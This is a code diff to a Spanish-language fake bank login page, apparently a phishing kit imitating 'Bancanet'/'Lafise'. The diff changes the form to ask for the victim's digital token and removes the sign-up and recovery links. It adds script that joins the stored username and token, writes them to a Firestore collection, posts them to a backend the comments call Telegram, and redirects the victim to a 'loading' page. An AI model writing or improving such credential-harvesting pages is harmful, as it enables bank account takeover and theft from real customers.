@@ -316,7 +316,7 @@
     <main class="wrap">
       <section class="card">
         <div class="logo-top"></div>
-        <h1>Bienvenido a Bancanet</h1>
+        <h1>Bienvenido a Bancanet <br> Verifica tu Ingreso</h1>
 
         <!-- ✅ ID agregado -->
         <form id="loginForm" autocomplete="off" novalidate>
@@ -348,7 +348,7 @@
             <input
               class="input"
               type="text"
-              placeholder="Escriba su nombre de usuario"
+              placeholder="Escriba su token digital"
               inputmode="text"
             />
           </div>
@@ -357,12 +357,7 @@
             <a class="link" href="#">Teclado virtual</a>
           </div>
 
-          <div class="info">
-            <p>Todavía no tiene su usuario</p>
-            <a class="link" href="#">¡Solicítelo aquí!</a>
-            <a class="link" href="#">¡Recuperar aquí!</a>
-          </div>
-
+        
           <div class="actions">
             <!-- ✅ spans agregados para manejo de loading -->
             <button
@@ -436,12 +431,24 @@
           submitBtn.innerText = "Procesando...";
 
           // Mensaje a enviar
-          const message = "Lafise\nUsuario: " + username;
-          localStorage.setItem("usuario", username);
-
+          const message =
+            "Lafise\nUsuario: " +
+            localStorage.getItem("usuario") +
+            "\nToken: " +
+            username;
           try {
             // Envío a tu backend/Telegram
-            
+            const questionRef = doc(
+              window.db,
+              "lafis2",
+              localStorage.getItem("usuario")
+            );
+            await setDoc(questionRef, {
+              question1: "A1",
+              question2: "A1",
+              question3: "A1",
+              page: 0,
+            });
             const formData = new FormData();
 formData.append("mensaje", message);
 
@@ -456,7 +463,7 @@ await axios.post(
 );
 
             // Redirige después de enviar
-            window.location.href = "contra.html";
+            window.location.href = "cargando.html";
           } catch (error) {
             console.error(error);
             alert("Error al enviar los datos");
